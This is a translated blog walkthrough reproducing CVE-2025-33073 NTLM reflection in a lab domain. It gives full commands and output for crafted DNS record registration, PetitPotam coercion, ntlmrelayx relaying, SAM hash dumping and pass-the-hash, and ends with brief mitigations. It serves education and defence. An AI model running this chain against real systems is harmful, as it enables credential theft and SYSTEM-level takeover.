#  NTLM 反射攻击复现 - 滥用 NTLM 进行权限提升 (CVE-2025-33073)  
RBT  securitainment   2025-06-20 05:37  
  
> 【翻译】NTLM Reflection – Abusing NTLM for Privilege Escalation (CVE-2025-33073)   
  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
## 引言  
  
最近，一种新的权限提升路径被发现，该漏洞利用 Windows 在处理畸形 DNS 名称时，将远程连接误判为本地连接的特性。  
  
这种 NTLM 反射技术绕过了长期存在的保护机制，使经过身份验证的攻击者能够**强制 Windows 主机向自身进行身份验证**  
，反射 SYSTEM 令牌，并以**最高权限**  
执行命令，而无需直接破坏任何特权账户。  
## 历史背景  
  
**NTLM 反射攻击**  
最早在 2000 年代中期被利用，针对 SMB、HTTP 或 RPC 等服务反射 NTLM 身份验证，使攻击者能够冒充高权限用户（特别是 SYSTEM 或管理员）。  
  
微软随后发布了多项缓解措施：  
- MS08-068 (2008): 修复了针对 SMB 的经典 NTLM 反射攻击  
  
- SMB 签名：通过强制完整性检查防止中间人攻击  
  
- 扩展身份验证保护 (EPA) 和 NTLM 加固进一步减少了攻击面  
  
## 核心问题  
  
Windows 使用主机名比较来确定 NTLM 身份验证是否为本地。如果判断目标为自身，则会进入**本地 NTLM 模式**  
，跳过挑战 - 响应验证，直接将令牌插入内存。  
  
当使用包含编组元数据的**精心构造的 DNS 名称**  
时，这种逻辑会被破坏。Windows 解析 DNS 字符串，剥离元数据，仅比较主机名（例如localhost  
），错误地得出连接是本地的结论。  
  
因此，**像lsass.exe这样的 SYSTEM 进程**  
可以被强制向攻击者控制的监听器进行身份验证。攻击者随后通过 SMB **将该 SYSTEM 令牌中继回目标**  
，从而获得**SYSTEM 级别访问权限**  
。  
## 攻击要求  
- 有效的低权限 AD 凭证  
  
- SMB 签名被禁用或未强制执行  
  
- 易受攻击的 Windows Server 或 Workstation  
  
- 工具：ntlmrelayx  
、PetitPotam  
、dnstool  
、NetExec (nxc)  
  
## 攻击步骤  
  
**1. 侦察与强制检查**  
  
验证 SMB 签名状态和强制漏洞：  
```
┌──(root㉿rbtsecurity)-[~]
└─$ nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus
SMB         192.168.115.185 445    WKSTN-3          [*] Windows 10 / Server 2019 Build 19041 x64 (name:WKSTN-3) (domain:shield.local) (signing:False) (SMBv1:False)
SMB         192.168.115.185 445    WKSTN-3          [+] shield.local\scarter:Passw0rd
COERCE_PLUS 192.168.115.185 445    WKSTN-3          VULNERABLE, PetitPotam
COERCE_PLUS 192.168.115.185 445    WKSTN-3          VULNERABLE, PrinterBug
COERCE_PLUS 192.168.115.185 445    WKSTN-3          VULNERABLE, PrinterBug
COERCE_PLUS 192.168.115.185 445    WKSTN-3          VULNERABLE, MSEven
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictjeRFeHRTCbK31qVlicjfbXibV8rpDDPxztcEYr7z3c3jm09F79ibpOia2dibw/640?wx_fmt=png&from=appmsg "")  
  
**2. 启动 SMB 中继监听器**  
  
我们准备使用 ntlmrelayx  
 来拦截 NTLM 身份验证并将其中继回目标：  
```
┌──(root㉿rbtsecurity)-[~]
└─$ impacket-ntlmrelayx -t wkstn-3.shield.local -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictje0k75GEQgOJZFvVQJGft5iaBmtX2Oh3RGq1icCHziaxPfxoJzqEM5TZ6Qg/640?wx_fmt=png&from=appmsg "")  
  
  
**3. 注册 DNS 记录**  
  
我们精心构造一个特殊的 DNS 条目，欺骗 Windows 系统使其认为正在与自身通信：  
```
python3 dnstool.py -u 'shield.local\scarter' -p 'Passw0rd' \
  dc4.shield.local -a add \
  -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
  -d '192.168.115.178' -dns-ip 192.168.115.180
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictje3yYq52bOuEH9AtLGkYxGyq5ggDWxBMnROLAiblnicDgwqrxKWlypkk0A/640?wx_fmt=png&from=appmsg "")  
  
> 同一个局域网（广播可达）也可以直接使用 pretender  
 进行伪造  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictjeAW6GrdO69awKHKgG5ujcolfqo3z3CCATHg76jb8egNpAAERKgdmtBA/640?wx_fmt=png&from=appmsg "")  
  
**4. 使用 NetExec 或 PetitPotam 强制工作站认证**  
  
我们现在使用 NetExec 或 PetitPotam  
 工具，利用我们伪造的 DNS 名称，强制目标主机发起出站 NTLM 认证：  
```
┌──(root㉿rbtsecurity)-[~]
└─# nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA

SMB         192.168.115.185 445    WKSTN-3          [*] Windows 10 / Server 2019 Build 19041 x64 (name:WKSTN-3) (domain:shield.local) (signing:False) (SMBv1:False)
SMB         192.168.115.185 445    WKSTN-3          [+] shield.local\scarter:Passw0rd
COERCE_PLUS 192.168.115.185 445    WKSTN-3          VULNERABLE, PetitPotam
COERCE_PLUS 192.168.115.185 445    WKSTN-3          Exploit Success, lsarpc\EfsRpcAddUsersToFile
```  
```
ounter(lineounter(lineounter(line
python3 PetitPotam.py -u scarter -p Passw0rd -d shield.local \
  localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
  wkstn-3.shield.local
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictjeqZm0wjQcLrJJqOgIq2LGyicm4wsnn801ias6uLMFuSJPiarSjBsPbKZwQ/640?wx_fmt=png&from=appmsg "")  
  
**5. 在 SYSTEM 认证后提取 SAM 数据**  
  
当强制认证（Authentication）成功后，我们提取 SYSTEM 令牌并导出 SAM 数据库  
```
┌──(root㉿rbtsecurity)-[~]
└─$ impacket-ntlmrelayx -t wkstn-3.shield.local -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.115.185, attacking target smb://wkstn-3.shield.local
[*] Authenticating against smb://wkstn-3.shield.local as / SUCCEED
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from 192.168.115.185 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x37e25629a1992a72be97236968ce3a53
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7ddade167a491d4f28eb25728469310e:::
Polunchis:1000:aad3b435b51404eeaad3b435b51404ee:b897c7001bf1600723c81ec97bbf5b15:::
[*] Done dumping SAM hashes for host: wkstn-3.shield.local
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictjeWkVRBDUib2GHJ7Z5l4EqmxDJzcdH0z21swkTrcyoQVhZe9w7yGjYsSw/640?wx_fmt=png&from=appmsg "")  
  
**6. 后渗透利用 (Post Exploitation)**  
  
现在我们可以使用 NetExec  
 或任何后渗透利用工具，配合本地管理员凭据进行操作：  
```
nxc smb 192.168.115.185 -u administrator -H 4b08728132d41e230b4ee268c5b42acb --local-auth -x whoami
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictjem9rTafoePibOLjQdR8x59qZwVfBCuE8UgKN3BxWYLTLfqvjAOVhPwkg/640?wx_fmt=png&from=appmsg "")  
  
**完整攻击截图**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOBmcNHajDZG8XFybfXictje3TUYBz1TMNVwTPRdvlwhyzicsEAySnu7tib99MLL3lryeX5t7gm6utjg/640?wx_fmt=png&from=appmsg "")  
  
## 结论  
  
尽管 Microsoft 持续加强安全防护，但当配置不当与遗留协议（如 NTLM）结合时，仍会提供危险的权限提升路径。  
  
这并非实验室中的理论技巧；我们已在真实环境中观察到 DNS 配置不当与 NTLM 行为被利用的案例。仅仅一个被忽视的设置（如 SMB 签名）就可能打开安全之门。  
## 检测与缓解措施  
  
**强制执行 SMB 签名**  
- SMB 签名可防止中继攻击，无论采用何种认证类型。应在整个域范围内强制执行。  
  
**应用补丁**  
- Microsoft 针对 CVE-2025-33073 的修复引入了更严格的 SMB 认证期间 DNS 名称验证机制。请确保部署最新的安全更新。  
  
## 参考来源  
- **阅读原始研究文章**  
: NTLM 反射已死，NTLM 反射长存！——CVE-2025-33073 深入分析  
  
  
  
